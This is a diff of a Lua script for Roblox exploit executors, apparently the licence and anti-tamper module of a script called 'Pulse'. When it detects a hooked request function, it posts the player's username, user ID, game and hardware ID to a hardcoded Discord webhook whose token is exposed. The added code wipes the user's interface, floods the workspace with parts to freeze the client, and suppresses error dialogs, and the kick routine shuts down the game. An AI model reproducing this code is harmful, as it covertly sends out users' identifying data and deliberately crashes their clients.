@@ -7,111 +7,49 @@ end
 
 task.wait(0.7)
 
-if request and pcall(function() return isexecutorclosure end) and not isexecutorclosure(request) then
-    local function jumpscare(imageId: string, soundId: string, text: string)
-        pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
-        setclipboard = function() end
-        
-        local sg = Instance.new("ScreenGui")
-        sg.Parent = pcall(gethui) and gethui() or game:GetService("CoreGui")
-        sg.ResetOnSpawn = false
-        sg.IgnoreGuiInset = true
-        
-        local img = Instance.new("ImageLabel")
-        img.Size = UDim2.new(1, 0, 1, 0)
-        img.Image = "rbxassetid://" .. imageId
-        img.BackgroundTransparency = 1
-        img.Parent = sg
-        
-        local txt = Instance.new("TextLabel")
-        txt.Size = UDim2.new(1, 0, 0.2, 0)
-        txt.Position = UDim2.new(0, 0, 0.4, 0)
-        txt.BackgroundTransparency = 1
-        txt.Text = text
-        txt.TextColor3 = Color3.new(1, 0, 0)
-        txt.TextScaled = true
-        txt.Font = Enum.Font.GothamBold
-        txt.Parent = sg
-        
-        local snd = Instance.new("Sound")
-        snd.SoundId = "rbxassetid://" .. soundId
-        snd.Volume = 10
-        snd.Parent = workspace
-        snd:Play()
-        
-        task.wait(2)
-        while true do end
-    end
-    
-    pcall(function()
-        local http = game:GetService("HttpService")
-        local plr = game:GetService("Players").LocalPlayer
-        local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
-        local executor = identifyexecutor() or "Unknown"
-        
-        request({
-            Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
-            Method = "POST",
-            Headers = {['Content-Type'] = 'application/json'},
-            Body = http:JSONEncode({
-                embeds = {{
-                    title = "🚨 HTTP SPY DETECTED",
-                    color = 15158332,
-                    thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
-                    fields = {
-                        {name = "Detection", value = "Request function already hooked", inline = false},
-                        {name = "Username", value = plr.Name, inline = true},
-                        {name = "User ID", value = tostring(plr.UserId), inline = true},
-                        {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
-                        {name = "HWID", value = "`" .. currentHWID .. "`", inline = false},
-                        {name = "Executor", value = executor, inline = true}
-                    },
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
-                    footer = {text = "PSS"}
-                }}
-            })
-        })
-    end)
-    
-    jumpscare("15889768437", "7111752052", "ALREADY HOOKED BOZO")
-end
+local plr = game:GetService("Players").LocalPlayer
 
-local function jumpscare(imageId: string, soundId: string, text: string, reason: string)
+local function jumpscare(imageId: string, soundId: string, text: string, reason: string?)
     pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
     setclipboard = function() end
     
-    pcall(function()
-        local http = game:GetService("HttpService")
-        local plr = game:GetService("Players").LocalPlayer
-        local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
-        local executor = identifyexecutor() or "Unknown"
-        
-        request({
-            Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
-            Method = "POST",
-            Headers = {['Content-Type'] = 'application/json'},
-            Body = http:JSONEncode({
-                embeds = {{
-                    title = "🚨 HTTP SPY DETECTED",
-                    color = 15158332,
-                    thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
-                    fields = {
-                        {name = "Detection", value = reason, inline = false},
-                        {name = "Username", value = plr.Name, inline = true},
-                        {name = "User ID", value = tostring(plr.UserId), inline = true},
-                        {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
-                        {name = "HWID", value = "`" .. currentHWID .. "`", inline = false},
-                        {name = "Executor", value = executor, inline = true}
-                    },
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
-                    footer = {text = "Pulse Security System"}
-                }}
+    if reason then
+        pcall(function()
+            local http = game:GetService("HttpService")
+            local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
+            local executor = identifyexecutor() or "Unknown"
+            
+            request({
+                Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
+                Method = "POST",
+                Headers = {['Content-Type'] = 'application/json'},
+                Body = http:JSONEncode({
+                    embeds = {{
+                        title = "🚨 HTTP SPY DETECTED",
+                        color = 15158332,
+                        thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
+                        fields = {
+                            {name = "Detection", value = reason, inline = false},
+                            {name = "Username", value = plr.Name, inline = true},
+                            {name = "User ID", value = tostring(plr.UserId), inline = true},
+                            {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
+                            {name = "HWID", value = "`" .. currentHWID .. "`", inline = false},
+                            {name = "Executor", value = executor, inline = true}
+                        },
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
+                        footer = {text = "Pulse Security System"}
+                    }}
+                })
             })
-        })
-    end)
+        end)
+    end
+    
+    for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() gui:Destroy() end) end
+    for _, gui in pairs(plr.PlayerGui:GetDescendants()) do pcall(function() gui:Destroy() end) end
+    pcall(function() for _, gui in pairs(gethui():GetDescendants()) do gui:Destroy() end end)
     
     local sg = Instance.new("ScreenGui")
-    sg.Parent = pcall(gethui) and gethui() or game:GetService("CoreGui")
+    sg.Parent = game:GetService("CoreGui")
     sg.ResetOnSpawn = false
     sg.IgnoreGuiInset = true
     
@@ -137,8 +75,24 @@ local function jumpscare(imageId: string, soundId: string, text: string, reason:
     snd.Parent = workspace
     snd:Play()
     
+    task.spawn(function()
+        while true do
+            for i = 1, 100 do
+                Instance.new("Part", workspace)
+            end
+            task.wait()
+        end
+    end)
+    
     task.wait(2)
-    while true do end
+    while true do 
+        pcall(function() game:GetService("GuiService"):ClearError() end)
+        task.wait() 
+    end
+end
+
+if request and pcall(function() return isexecutorclosure end) and not isexecutorclosure(request) then
+    jumpscare("15889768437", "7111752052", "ALREADY HOOKED BOZO", "Request function already hooked")
 end
 
 task.spawn(function()
@@ -176,7 +130,6 @@ task.spawn(function()
     end
 end)
 
-
 local function isOwnError(msg: string): boolean
     return msg:match("Remotes") 
         or msg:match("SoftDisPlayer")
@@ -207,7 +160,6 @@ end)
 local api = "https://gist.githubusercontent.com/DownInDaNang/63c9dc4c4d155cc74d03ef1fe938bf82/raw/55f393366c353bbc4e119778d9549a89be31a6df/bs3_pulse.json"
 local blacklistUrl = "https://gist.githubusercontent.com/DownInDaNang/99873c62b13bcb6ba766d19a5788daf9/raw/gistfile1.txt"
 local http = game:GetService("HttpService")
-local plr = game:GetService("Players").LocalPlayer
 local settings = {
     EnableWhitelist = false,
     EnableHWID = false,
@@ -216,8 +168,12 @@ local settings = {
 }
 
 local function forceKick(reason: string)
+    for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() gui:Destroy() end) end
+    for _, gui in pairs(plr.PlayerGui:GetDescendants()) do pcall(function() gui:Destroy() end) end
+    pcall(function() for _, gui in pairs(gethui():GetDescendants()) do gui:Destroy() end end)
+    
     local sg = Instance.new("ScreenGui")
-    sg.Parent = pcall(gethui) and gethui() or game:GetService("CoreGui")
+    sg.Parent = game:GetService("CoreGui")
     sg.ResetOnSpawn = false
     sg.IgnoreGuiInset = true
     
@@ -247,9 +203,18 @@ local function forceKick(reason: string)
     msg.TextWrapped = true
     msg.Parent = frame
     
+    task.spawn(function()
+        while true do
+            for i = 1, 100 do
+                Instance.new("Part", workspace)
+            end
+            task.wait()
+        end
+    end)
+    
     task.wait(0.5)
     game:Shutdown()
-    while true do end
+    while true do task.wait() end
 end
 
 local function sendWebhook(status: string, reason: string?)
@@ -259,7 +224,12 @@ local function sendWebhook(status: string, reason: string?)
     end
     
     local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
-    local data = http:JSONDecode(game:HttpGet(api))
+    local dataSuccess, data = pcall(function() return http:JSONDecode(game:HttpGet(api)) end)
+    if not dataSuccess then
+        forceKick("Failed to fetch authentication data. Please try again later.")
+        return
+    end
+    
     local executor = identifyexecutor() or "Unknown"
     
     local statusEmoji = status == "Authenticated" and "✅" or (status == "Expired" and "⚠️" or "⛔")
@@ -279,21 +249,27 @@ local function sendWebhook(status: string, reason: string?)
         table.insert(fields, 3, {name = "Reason", value = reason, inline = false})
     end
     
-    request({
-        Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = http:JSONEncode({
-            embeds = {{
-                title = "🔐 Pulse Authentication",
-                color = embedColor,
-                thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
-                fields = fields,
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
-                footer = {text = "PSS"}
-            }}
+    local webhookSuccess = pcall(function()
+        request({
+            Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = http:JSONEncode({
+                embeds = {{
+                    title = "🔐 Pulse Authentication",
+                    color = embedColor,
+                    thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
+                    fields = fields,
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
+                    footer = {text = "PSS"}
+                }}
+            })
         })
-    })
+    end)
+    
+    if not webhookSuccess then
+        forceKick("Failed to send authentication webhook. Security check failed.")
+    end
 end
 
 local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
@@ -307,8 +283,13 @@ end
 
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-local data = http:JSONDecode(game:HttpGet(blacklistUrl))
-local blacklist = data.blacklist or {}
+local blacklistSuccess, blacklistData = pcall(function() return http:JSONDecode(game:HttpGet(blacklistUrl)) end)
+if not blacklistSuccess then
+    forceKick("Failed to fetch blacklist data. Please try again later.")
+    return
+end
+
+local blacklist = blacklistData.blacklist or {}
 
 if blacklist[hwid] then
     local ban = blacklist[hwid]
@@ -324,7 +305,12 @@ if blacklist[hwid] then
 end
 
 if settings.EnableExpire then
-    local expireData = http:JSONDecode(game:HttpGet(api))
+    local expireSuccess, expireData = pcall(function() return http:JSONDecode(game:HttpGet(api)) end)
+    if not expireSuccess then
+        forceKick("Failed to verify expiration status. Please try again later.")
+        return
+    end
+    
     if os.time() > expireData.expire then
         sendWebhook("Expired", "Script key has expired")
         forceKick("Script has expired. Please obtain an updated version.")
